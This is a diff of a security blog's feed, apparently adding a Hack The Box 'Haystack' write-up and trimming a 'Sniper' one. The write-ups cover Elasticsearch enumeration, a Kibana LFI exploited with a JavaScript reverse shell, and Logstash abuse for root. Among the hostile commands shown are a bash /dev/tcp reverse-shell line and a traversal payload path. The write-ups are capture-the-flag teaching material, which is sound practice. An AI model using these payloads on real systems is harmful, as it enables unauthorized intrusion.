@@ -1,4 +1,250 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-21T14:11:26+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Hard] - Talkative</title><link href="http://localhost:4000/2022/10/19/Talkative.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Hard] - Talkative" /><published>2022-10-19T00:00:00+02:00</published><updated>2022-10-19T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/19/Talkative</id><content type="html" xml:base="http://localhost:4000/2022/10/19/Talkative.html"><![CDATA[<p><img src="/assets/Talkative/Talkative.png" alt="" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-28T16:37:15+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Easy] - Haystack</title><link href="http://localhost:4000/2022/10/28/Haystack.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Haystack" /><published>2022-10-28T00:00:00+02:00</published><updated>2022-10-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/28/Haystack</id><content type="html" xml:base="http://localhost:4000/2022/10/28/Haystack.html"><![CDATA[<p><img src="/assets/Haystack/Haystack.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Haystack</strong> was a quite nice <strong>Linux</strong> box. it had an <strong>unprotected Elasticsearch</strong> instance which let us <strong>enumerate all indeces</strong> (<em>equivalent to database tables</em>).</li>
+  <li><em>Hidden amongst the data,</em> was a <strong>username and password</strong> encoded in <strong>base64</strong>. Those worked and got us on the box via <strong>SSH</strong>.</li>
+  <li><em>On the box,</em> we detected a <strong>locally-listening Kibana interface</strong> which we <strong>exposed with an SSH tunnel.</strong></li>
+  <li><em>After fingerprinting Kibana,</em> we found the version <strong>vulnerable to Local File Inclusion</strong> which <strong>could lead to RCE</strong> if we could <strong>write a shell somewhere on the host.</strong></li>
+  <li><em>Having access to file system,</em> we placed a <strong>JavaScript reverse shell</strong> in the <code class="language-plaintext highlighter-rouge">/tmp</code> folder and <strong>included it using the LFI</strong> to <strong>get a shell</strong> as the <code class="language-plaintext highlighter-rouge">kibana</code> user.</li>
+  <li><em>Noticing the</em> <strong><em>Logstash</em></strong> <em>service running as</em> <code class="language-plaintext highlighter-rouge">root</code>, we checked if we can <strong>modify or abuse its filters</strong> to <strong>run commands in a privileged context.</strong></li>
+  <li><em>The filters weren’t writable,</em> but they <strong>ran commands from a directory where we had write access.</strong></li>
+  <li><em>After</em> <strong><em>placing a file with a matching name</em></strong> <em>and</em> <strong><em>inserting our command in the expected format,</em></strong> our code <strong>got executed</strong> as <code class="language-plaintext highlighter-rouge">root</code> and we owned the box.</li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION              
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:                                                                                                    
+|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
+|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
+|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
+80/tcp   open  http    nginx 1.12.2                                                                               
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.12.2          
+9200/tcp open  http    nginx 1.12.2                                                                               
+| http-methods:                                                                                                   
+|_  Potentially risky methods: DELETE                                                                             
+|_http-title: Site doesn't have a title (application/json; charset=UTF-8).                      
+|_http-server-header: nginx/1.12.2 
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">nmap</code> result showed:</p>
+<ul>
+  <li><strong>SSH</strong> on its default port <em>(that version allows for username enumeration)</em></li>
+  <li><strong>HTTP</strong> on both ports <strong>80</strong> and <strong>9200</strong></li>
+</ul>
+
+<h2 id="checking-port-80">Checking Port 80</h2>
+<p>Here we only saw a picture of well.. <strong><em>a needle in a haystack :)</em></strong></p>
+
+<p><img src="/assets/Haystack/port-80-image.jpg" alt="" /></p>
+
+<p>we used <code class="language-plaintext highlighter-rouge">wget</code> to <strong>download it</strong> and then <strong>checked for useful info in it’s metadata</strong> using <code class="language-plaintext highlighter-rouge">exiftool</code></p>
+
+<p><img src="/assets/Haystack/download-and-exif-needle-jpeg.jpg" alt="" /></p>
+
+<p>but we did’t find anything there.</p>
+
+<p>we also ran <code class="language-plaintext highlighter-rouge">gobuster</code> to <strong>search for endpoints</strong> but without anything new. so we moved on.</p>
+
+<h2 id="enumerating-elasticsearch">Enumerating Elasticsearch</h2>
+<p><em>On port 9200,</em> we instantly noticed a keyword: <strong>“Elasticsearch”</strong></p>
+
+<p><img src="/assets/Haystack/elastic-search-found.jpg" alt="" /></p>
+
+<p><strong>Enumerating Elastic</strong> is pretty straightforward following this awesome <a href="https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch">HackTricks</a> page.</p>
+
+<p><em>before we start,</em> some <strong>basic Elasticsearch terminology</strong>:</p>
+
+<ul>
+  <li><strong>An Index</strong> is a <strong>collection of documents</strong></li>
+  <li><strong>A Document</strong> is a <strong>set of JSON-formatted key-value pairs</strong></li>
+</ul>
+
+<p><em>Per index,</em> we want to <strong>retrieve as many documents</strong> as we can so we can <strong>access the most amount of data.</strong></p>
+
+<p><em>to get the list of indeces,</em> we can use <code class="language-plaintext highlighter-rouge">curl</code> to send a <strong>GET request</strong> to the <code class="language-plaintext highlighter-rouge">/_cat/indices?v</code> endpoint.</p>
+
+<p><img src="/assets/Haystack/cat-elastic-indeces.jpg" alt="" /></p>
+
+<p><em>doing that,</em> we get back:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">.kibana</code></li>
+  <li><code class="language-plaintext highlighter-rouge">quotes</code></li>
+  <li><code class="language-plaintext highlighter-rouge">bank</code></li>
+</ol>
+
+<p><strong><em>to get the documents for each index,</em></strong> we will again use <code class="language-plaintext highlighter-rouge">curl</code> but with a <strong>different URL format:</strong> <code class="language-plaintext highlighter-rouge">/&lt;INDEX_NAME&gt;/_search?size=&lt;NUMBER_OF_DOCUMENTS&gt;</code></p>
+
+<p>and will <strong>pipe the JSON output</strong> to <code class="language-plaintext highlighter-rouge">jq</code> to make it <strong>prettier and more accessible.</strong></p>
+
+<p><em>starting with the</em> <code class="language-plaintext highlighter-rouge">.kibana</code> <em>index,</em> we didn’t find anything signicant there.</p>
+
+<p><img src="/assets/Haystack/kibana-index.jpg" alt="" /></p>
+
+<p>so we went for the <code class="language-plaintext highlighter-rouge">quotes</code> index next.</p>
+
+<p><img src="/assets/Haystack/quotes-index.jpg" alt="" /></p>
+
+<p>it <em>initially</em> looked like a <strong>bunch of junk</strong>. but <strong><em>it also looked like a haystack :D</em></strong></p>
+
+<p>where was the needle, though?</p>
+
+<p><strong><em>to take a shortcut and to try making the search easier,</em></strong> we decided to <strong>search for any special characters</strong> using <code class="language-plaintext highlighter-rouge">grep</code></p>
+
+<p>the logic was to <strong>find anything that’s NOT normal text.</strong></p>
+
+<p><em>when grepping for the</em> <code class="language-plaintext highlighter-rouge">:</code>, we <strong>found two needles :D</strong></p>
+
+<p><img src="/assets/Haystack/finding-two-needles.jpg" alt="" /></p>
+
+<p><em>since it was</em> <strong><em>in spanish,</em></strong> we used <strong>Google Translate</strong></p>
+
+<p><img src="/assets/Haystack/spanish-translate.jpg" alt="" /></p>
+
+<p><em>noticing from the trailing</em> <code class="language-plaintext highlighter-rouge">=</code>, we knew they were both likely <strong>base64-encoded.</strong></p>
+
+<p>decoding them gave us <code class="language-plaintext highlighter-rouge">security</code> and <code class="language-plaintext highlighter-rouge">spanish.is.key</code> which were <strong>a valid username and password for SSH</strong>.</p>
+
+<p><img src="/assets/Haystack/ssh-as-security.jpg" alt="" /></p>
+
+<h2 id="lateral-movement-via-exploiting-kibana">Lateral Movement via Exploiting Kibana</h2>
+<p><em>Right after logging in,</em> we ran a quick <a href="https://github.com/carlospolop/PEASS-ng">linpeas</a> to see <strong>what can help us privesc.</strong></p>
+
+<p><em>after checking a couple of things,</em> we noticed <strong>a new set of local ports listening:</strong></p>
+
+<p><img src="/assets/Haystack/locally-listening-ports.jpg" alt="" /></p>
+
+<p><em>so, to check those,</em>  we <strong>leveraged our SSH access</strong> to easily <strong>create tunnels:</strong></p>
+
+<p><img src="/assets/Haystack/ssh-tunnels.jpg" alt="" /></p>
+
+<p><em>starting with port 5601,</em> we found <strong>Kibana</strong></p>
+
+<p><img src="/assets/Haystack/discovering-kibana.jpg" alt="" /></p>
+
+<p><strong><em>in its management tab,</em></strong> we could <strong>detect the version</strong></p>
+
+<p><img src="/assets/Haystack/kibana-version.jpg" alt="" /></p>
+
+<p>And <strong>a quick search on Google</strong> revealed an <strong>available PoC</strong> on <a href="https://github.com/mpgn/CVE-2018-17246">Github</a></p>
+
+<p><img src="/assets/Haystack/kibana-exploit-search-google.jpg" alt="" /></p>
+
+<p><em>checking it,</em> we noticed that <strong>this exploit was exactly suited to our situation</strong> <em>(having write access on the machine).</em></p>
+
+<p><img src="/assets/Haystack/kibana-lfi-github.jpg" alt="" /></p>
+
+<p>we needed to <strong>place a JavaScript reverse shell</strong> somewhere <strong>readable to all users on the box</strong> (like <code class="language-plaintext highlighter-rouge">/tmp</code>) then <strong>include it.</strong></p>
+
+<p>this <strong>code</strong> for it was <strong>on the same Github repository.</strong></p>
+
+<p><img src="/assets/Haystack/JS-rev-shell-code.jpg" alt="" /></p>
+
+<p>we created <code class="language-plaintext highlighter-rouge">rev.js</code> using <code class="language-plaintext highlighter-rouge">vi</code> and <strong>modified both the host and port</strong></p>
+
+<p><img src="/assets/Haystack/rev-js-created.jpg" alt="" /></p>
+
+<p>then <strong>triggered the LFI</strong> at <code class="language-plaintext highlighter-rouge">/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../tmp/rev.js</code></p>
+
+<p><img src="/assets/Haystack/got-rev-as-kibana.jpg" alt="" /></p>
+
+<p>we were now inside as the <code class="language-plaintext highlighter-rouge">kibana</code> user.</p>
+
+<h2 id="exploiting-logstash-for-privilege-escalation">Exploiting Logstash for Privilege Escalation</h2>
+<p><em>Previously, when we ran</em> <code class="language-plaintext highlighter-rouge">linpeas</code>, we had saw something interesting:</p>
+
+<p>the <strong>Logstash process was running as</strong> <code class="language-plaintext highlighter-rouge">root</code></p>
+
+<p><img src="/assets/Haystack/logstash-running-as-root.jpg" alt="" /></p>
+
+<p>the <strong>“logstash” word</strong> was <strong>highlighted in blue</strong>.</p>
+
+<p><em>but if we broke it down,</em> it’s <strong>rather simple:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/java <span class="se">\</span>
+<span class="nt">-Xms500m</span> <span class="se">\</span>
+<span class="nt">-Xmx500m</span> <span class="se">\</span>
+<span class="nt">-XX</span>:+UseParNewGC <span class="se">\</span>
+<span class="nt">-XX</span>:+UseConcMarkSweepGC <span class="se">\</span>
+<span class="nt">-XX</span>:CMSInitiatingOccupancyFraction<span class="o">=</span>75 <span class="se">\</span>
+<span class="nt">-XX</span>:+UseCMSInitiatingOccupancyOnly <span class="se">\</span>
+<span class="nt">-Djava</span>.awt.headless<span class="o">=</span><span class="nb">true</span> <span class="se">\</span>
+<span class="nt">-Dfile</span>.encoding<span class="o">=</span>UTF-8 <span class="se">\</span>
+<span class="nt">-Djruby</span>.compile.invokedynamic<span class="o">=</span><span class="nb">true</span> <span class="se">\</span>
+<span class="nt">-Djruby</span>.jit.threshold<span class="o">=</span>0 <span class="se">\</span>
+<span class="nt">-XX</span>:+HeapDumpOnOutOfMemoryError <span class="se">\</span>
+<span class="nt">-Djava</span>.security.egd<span class="o">=</span>file:/dev/urandom <span class="se">\</span>
+<span class="nt">-cp</span> 
+/usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar: 
+/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar: 
+..SNIP..
+/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar: 
+/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar
+org.logstash.Logstash <span class="se">\</span>
+<span class="nt">--path</span>.settings /etc/logstash
+</code></pre></div></div>
+
+<p>these were just <strong>some command-line arguments</strong> to start up <code class="language-plaintext highlighter-rouge">Logstash</code> with <strong>a specific configuration.</strong></p>
+
+<p><em>from the last argument:</em> <code class="language-plaintext highlighter-rouge">--path.settings /etc/logstash</code>, we know that <code class="language-plaintext highlighter-rouge">/etc/logstash</code> would be <strong>an interesting place to look</strong> for ways to exploit.</p>
+
+<p><em>specially,</em> when <code class="language-plaintext highlighter-rouge">linpeas</code> has pointed out that <strong>the files within were ONLY readable by our now-owned</strong> <code class="language-plaintext highlighter-rouge">kibana</code> <strong>user.</strong></p>
+
+<p><img src="/assets/Haystack/logstash-files-found.jpg" alt="" /></p>
+
+<p>Looking at <strong>the files in the main Logstash configuration</strong> looked promising.</p>
+
+<p><img src="/assets/Haystack/checking-logstash-conf-files.jpg" alt="" /></p>
+
+<p><em>Without any research,</em> you could <strong>get the gist</strong> of what’s within just by <strong><em>assembling the pieces together</em></strong>.</p>
+
+<p><img src="/assets/Haystack/logstash-understanding-files.jpg" alt="" /></p>
+
+<p><strong><em>knowing that the process is running as</em></strong> <code class="language-plaintext highlighter-rouge">root</code>, merely <strong>seeing the sentence “Execute command” here</strong> is enough to <strong>confirm that we’re on the right path.</strong></p>
+
+<p><em>So, to understand the mechanics here,</em> we <strong>searched Google</strong> for <strong>“Logstash configuration”</strong> and found the <a href="https://www.elastic.co/guide/en/logstash/current/configuration.html">official documenation</a> sufficient.</p>
+
+<p><em>to exploit this situation,</em> we will need to <strong>place a file whose name begins with “logstash_“</strong> in the <code class="language-plaintext highlighter-rouge">/opt/kibana</code> directory. just as the <code class="language-plaintext highlighter-rouge">input.conf</code> suggests:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>input {
+    file {
+        path =&gt; "/opt/kibana/logstash_*"
+        start_position =&gt; "beginning"
+        sincedb_path =&gt; "/dev/null"
+        stat_interval =&gt; "10 second"
+        type =&gt; "execute"
+        mode =&gt; "read"
+    }
+}
+</code></pre></div></div>
+
+<p>and <strong>make sure it matches</strong> the <code class="language-plaintext highlighter-rouge">filter.conf</code> criteria:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>filter {
+    if [type] == "execute" {
+        grok {
+            match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+        }
+    }
+}
+</code></pre></div></div>
+
+<p><strong><em>translating this regular expression,</em></strong> our <code class="language-plaintext highlighter-rouge">logstash_</code> file should contain:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Ejecutar</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">commando</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">:</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">&lt;command&gt;</code></p>
+
+<p><em>In order to own this box,</em> we would do something like <strong>place a reverse shell as the</strong> <code class="language-plaintext highlighter-rouge">commando</code> <strong>argument.</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.16.9/9000 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><strong><em>which works like a charm :D</em></strong></p>
+
+<p><img src="/assets/Haystack/rooting_the_box.jpg" alt="" /></p>
+
+<p><strong>está muerto..</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Hard] - Talkative</title><link href="http://localhost:4000/2022/10/19/Talkative.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Hard] - Talkative" /><published>2022-10-19T00:00:00+02:00</published><updated>2022-10-19T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/19/Talkative</id><content type="html" xml:base="http://localhost:4000/2022/10/19/Talkative.html"><![CDATA[<p><img src="/assets/Talkative/Talkative.png" alt="" /></p>
 
 <h2 id="summary">Summary</h2>
 <ul>
@@ -3415,481 +3661,4 @@ lxc <span class="nb">exec </span>brainfucked /bin/sh
 
 <p><img src="/assets/Brainfuck/rooted.jpg" alt="" /></p>
 
-<p><strong>A piece of cake :D</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Sniper</title><link href="http://localhost:4000/2022/08/05/Sniper.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Sniper" /><published>2022-08-05T00:00:00+02:00</published><updated>2022-08-05T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/05/Sniper</id><content type="html" xml:base="http://localhost:4000/2022/08/05/Sniper.html"><![CDATA[<p><img src="/assets/Sniper/Sniper.png" alt="Sniper" /></p>
-
-<h2 id="summary">Summary</h2>
-<ul>
-  <li>The box is a <strong>Windows</strong> machine <strong>hosting a PHP website</strong> which had both a <strong>LFI</strong> (intended) and a <strong>RFI</strong> (unintended) vulnerabilities.</li>
-  <li><em>Down the LFI path, and after working around some</em> <strong>blacklisting</strong> <em>and</em> <strong>hardening</strong>, we manage to <strong>inject PHP code into the cookies</strong> and <strong>include them to gain RCE.</strong></li>
-  <li>We gain initial access as <code class="language-plaintext highlighter-rouge">NT Authority\iusr</code>. And, <em>as we are taking a look around the</em> <strong>web root</strong>, we find <strong>credentials</strong> for a local user called <code class="language-plaintext highlighter-rouge">chris</code> in the <strong>database settings file.</strong></li>
-  <li>We used <strong>PowerShell</strong> to gain <strong>another reverse shell</strong> as that user and started looking for ways to escalate our privileges.</li>
-  <li><em>In <code class="language-plaintext highlighter-rouge">chris</code>’s <code class="language-plaintext highlighter-rouge">Downloads</code> folder</em>, we found a file called <code class="language-plaintext highlighter-rouge">instructions.chm</code> which mentioned <strong>some documentation work to be delivered to the company’s CEO</strong>.</li>
-  <li><em>Also relevant to the same topic,</em> a folder called <code class="language-plaintext highlighter-rouge">Docs</code> in the root of the <code class="language-plaintext highlighter-rouge">C:</code> drive contained a <strong>note for the developer</strong> (<code class="language-plaintext highlighter-rouge">chris</code>) from the CEO <strong>asking for the documentation to be dropped there</strong> when done.</li>
-  <li><em>To exploit the situation</em>, we create a <strong>malicious .CHM file</strong> using the <strong>Nishang PowerShell Suite</strong> to <strong>execute commands</strong> if that file was opened.</li>
-  <li><em>After placing the file in the <code class="language-plaintext highlighter-rouge">Docs</code> folder</em>, a few moments pass and the file gets removed. We <strong>verify execution of our payload</strong> (resetting the <code class="language-plaintext highlighter-rouge">administrator</code>’s password) by logging in and we’re successfully authenticated.</li>
-</ul>
-
-<hr />
-
-<h2 id="nmap">NMAP</h2>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
-80/tcp    open  http          Microsoft IIS httpd 10.0
-|_http-title: Sniper Co.
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds?
-49667/tcp open  msrpc         Microsoft Windows RPC
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-time: 
-|   date: 2022-08-03T22:05:26
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-|_clock-skew: 6h59m59s
-</code></pre></div></div>
-
-<p>Nmap gives us a few things to check:</p>
-<ol>
-  <li><strong>HTTP</strong> on Port 80</li>
-  <li><strong>RPC</strong> on port 135</li>
-  <li><strong>SMB</strong> on port 445</li>
-</ol>
-
-<p>We start with <strong>SMB</strong> and <strong>RPC</strong> since they are a quick check.</p>
-
-<h2 id="smb-enumeration">SMB Enumeration</h2>
-<p>we check the usual <strong>null, anonymous and guest authentication</strong> with <code class="language-plaintext highlighter-rouge">crackmapexec</code> but don’t get much past the <strong>OS</strong> and the <strong>hostname</strong>.
-<img src="/assets/Sniper/SMB-Enum.jpg" alt="SMB-Enum" /></p>
-
-<h2 id="rpc-enumeration">RPC Enumeration</h2>
-<p>we use <code class="language-plaintext highlighter-rouge">enum4linux-ng</code> but don’t get much information here either</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux-ng.py <span class="nt">-A</span> sniper
-</code></pre></div></div>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENUM4LINUX - next generation           
-                                                                                                                                                                                                                                    
- ==========================  
-|    Target Information    |                                                                                                                                                                                                        
- ==========================                              
-[*] Target ........... sniper                            
-[*] Username ......... ''                                                                                                                                                                                                           
-[*] Random Username .. 'stnvbvxv'                                                                                 
-[*] Password ......... ''                                                                                                                                                                                                           
-[*] Timeout .......... 5 second(s)                       
-                                                                                                                  
- ==============================                    
-|    Service Scan on sniper    |                                                                                  
- ==============================                                                                                                                                                                                                     
-[*] Checking LDAP                                                                                                                                                                     
-[-] Could not connect to LDAP on 389/tcp: timed out                                                                               
-[*] Checking LDAPS                                                                                                                
-[-] Could not connect to LDAPS on 636/tcp: timed out     
-[*] Checking SMB                                                                                                  
-[+] SMB is accessible on 445/tcp                       
-[*] Checking SMB over NetBIOS                         
-[+] SMB over NetBIOS is accessible on 139/tcp                                                                                     
-                                                                                                                  
- ==============================================          
-|    NetBIOS Names and Workgroup for sniper    |                 
- ==============================================
-[-] Could not get NetBIOS names information via 'nmblookup': timed out                                                                                  
-                                                                                                                                                        
- ===================================                                                                              
-|    SMB Dialect Check on sniper    |                                                                                                                   
- ===================================                                                                                                                    
-[*] Trying on 445/tcp                                                                                             
-[+] Supported dialects and settings:                                                                              
-SMB 1.0: false                                                                                                                                                                        
-SMB 2.02: true                                                                                                                    
-SMB 2.1: true                                                                                                                     
-SMB 3.0: true                                                                                                                                                                         
-SMB1 only: false                                         
-Preferred dialect: SMB 3.0                            
-SMB signing required: false                            
-                                                                                                                  
- ===================================                                                                                                                                                  
-|    RPC Session Check on sniper    |                    
- ===================================                                                                              
-[*] Check for null session                                                                                        
-[-] Could not establish null session: STATUS_ACCESS_DENIED                                                                                              
-[*] Check for random user session                                                                                                 
-[-] Could not establish random user session: STATUS_INVALID_PARAMETER                                                                                   
-[-] Sessions failed, neither null nor user sessions were possible                                                                                       
-                                                                                                                                                        
- =====================================================           
-|    Domain Information via SMB session for sniper    |                                                                                                                               
- =====================================================                      
-[*] Enumerating via unauthenticated SMB session on 445/tcp                                                                                              
-[+] Found domain information via SMB                                                                                                                                                  
-NetBIOS computer name: SNIPER                                                                                                                                                         
-NetBIOS domain name: ''                                                     
-DNS domain: Sniper                                                          
-FQDN: Sniper                                                                
-                                                                                                                  
- =========================================                                                                                                              
-|    OS Information via RPC for sniper    |                                                
- =========================================                                                                        
-[*] Enumerating via unauthenticated SMB session on 445/tcp                                  
-[+] Found OS information via SMB                                            
-[*] Enumerating via 'srvinfo'                                               
-[-] Skipping 'srvinfo' run, null or user session required                                                                                                                             
-[+] After merging OS information we have the following result:                                                    
-OS: Windows 10, Windows Server 2019, Windows Server 2016                                   
-OS version: '10.0'                                                                                                
-OS release: '1809'                                                                         
-OS build: '17763'                                                                          
-Native OS: not supported                                                                                          
-Native LAN manager: not supported                                                                                                                       
-Platform id: null                                                                                                 
-Server type: null                                                                                                                                       
-Server type string: null                                                                                          
-
-[!] Aborting remainder of tests since sessions failed, rerun with valid credentials                               
-                                                                                                                  
-Completed after 19.76 seconds 
-</code></pre></div></div>
-
-<h2 id="web-enumeration">Web Enumeration</h2>
-<p><em>On port 80,</em> we find a website
-<img src="/assets/Sniper/website.jpg" alt="website" /></p>
-
-<p>We get a <strong>login and registration form</strong> when we click the <strong>“User Portal”</strong><br />
-<img src="/assets/Sniper/login-page.jpg" alt="login-page" /></p>
-
-<p><img src="/assets/Sniper/register-page.jpg" alt="register-page" /></p>
-
-<p>We run <code class="language-plaintext highlighter-rouge">sqlmap</code> on both forms but don’t find any <strong>SQL injection</strong> :/</p>
-
-<h2 id="finding-a-file-inclusion-vulnerability">Finding a File Inclusion Vulnerability</h2>
-<p><em>However, when we go to the</em> <strong>services page</strong> <em>and check the</em> <strong>url for the language</strong> <em>in the dropdown menu,</em> we notice something interesting:</p>
-
-<p><img src="/assets/Sniper/spotting-lfi-param.jpg" alt="spotting-lfi-param" /></p>
-
-<p>The <strong>lang</strong> parameter takes a <code class="language-plaintext highlighter-rouge">.php</code> file name. This looks like a <strong>file inclusion vulnerability.</strong></p>
-
-<p><em>To verify it,</em> we first try to <strong>include a file we’re 100% sure exists.</strong></p>
-
-<p>so we choose a <strong>CSS</strong> file from the <strong>source code</strong> of that page.</p>
-
-<p><img src="/assets/Sniper/verifying-lfi.jpg" alt="verifying-lfi" /></p>
-
-<p>and try including it</p>
-
-<p><img src="/assets/Sniper/lfi-verified.jpg" alt="lfi-verified" /></p>
-
-<p><strong>We have verified a Local File Inclusion here.</strong></p>
-
-<p><em>In order to gain</em> <strong>RCE</strong> <em>from this,</em> we have a challenge to:</p>
-<ol>
-  <li>Find a file where we can <strong>inject PHP code</strong></li>
-  <li>Be able to <strong>reference it through the vulnerability to get code execution</strong></li>
-</ol>
-
-<h2 id="targeting-cookies">Targeting Cookies</h2>
-<p><strong>Cookies</strong> are a good place to start because:</p>
-<ul>
-  <li><strong>PHP stores the username inside them</strong> &amp; <strong>we have the ability to register users</strong></li>
-  <li><em>Also, In Windows, by default,</em> they are kept in a <em>likely accessible</em> directory <code class="language-plaintext highlighter-rouge">"c:\windows\temp"</code></li>
-  <li>Their file name has a known format: “<code class="language-plaintext highlighter-rouge">sess_&lt;PHPSESSID_COOKIE_VALUE&gt;</code>”</li>
-</ul>
-
-<p>So we need to:</p>
-<ol>
-  <li>Be able to <strong>write PHP code</strong> into the <strong>username field</strong> in the <strong>registration form</strong></li>
-  <li><strong>Login with that username</strong> and <strong>get a cookie</strong></li>
-  <li><strong>Reference that cookie file</strong> <em>using the</em> <strong>LFI vulnerability we found</strong></li>
-</ol>
-
-<p><strong><em>Sounds like a lot … and it is a lot XD</em></strong></p>
-
-<h2 id="user-registration">User Registration</h2>
-<p>We do a <strong>quick registration attempt</strong> to <strong>find out the limitations in user creation</strong>.</p>
-
-<p>We used:</p>
-<ul>
-  <li><strong>Email:</strong> <code class="language-plaintext highlighter-rouge">"a@a"</code></li>
-  <li><strong>Username:</strong> <code class="language-plaintext highlighter-rouge">"a"</code></li>
-  <li><strong>Password:</strong> <code class="language-plaintext highlighter-rouge">"a"</code></li>
-</ul>
-
-<p>and the registration suceeded!</p>
-
-<p><strong><em>This user has a special type of security. No one could ever guess creds like these :D :D</em></strong></p>
-
-<p><em>After logging in,</em> the page looked like this:</p>
-
-<p><img src="/assets/Sniper/login-success.jpg" alt="login-success" /></p>
-
-<h2 id="including-the-cookie">Including the cookie</h2>
-<p><em>Before going further,</em> we need to <strong>confirm we can reference the cookie on disk</strong>.</p>
-
-<p>we can get the cookie from the <strong>Firefox developer tools.</strong></p>
-
-<p><img src="/assets/Sniper/getting-cookies.jpg" alt="getting-cookies" /></p>
-
-<p>We first try the <strong>full path</strong> to the cookie: <code class="language-plaintext highlighter-rouge">"c:\windows\temp\sess_bbv0f4mgcubtrvp548rvg62uui"</code></p>
-
-<p>But that doesn’t work and we <strong>get an error page</strong></p>
-
-<p><img src="/assets/Sniper/lfi-no-full-path.jpg" alt="lfi-no-full-path" /></p>
-
-<p><em>After many many tries:</em></p>
-<ul class="task-list">
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><strong>Normal traversal sequences</strong> like <code class="language-plaintext highlighter-rouge">../../</code></li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><strong>Nested</strong> ones such as <code class="language-plaintext highlighter-rouge">....//</code> or <code class="language-plaintext highlighter-rouge">....\/</code></li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" /><strong>Single</strong> and <strong>Double URL encoding</strong></li>
-  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />and other techniques..</li>
-</ul>
-
-<p>I found out that I could include the cookie like this:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/windows/temp/sess_bbv0f4mgcubtrvp548rvg62uui
-</code></pre></div></div>
-
-<p><img src="/assets/Sniper/lfi-abs-path-success.jpg" alt="lfi-abs-path-success" /></p>
-
-<p>That’s because the <strong>PHP</strong> code is likely:</p>
-<ul>
-  <li><strong>Not accepting</strong> any <code class="language-plaintext highlighter-rouge">..</code> sequences</li>
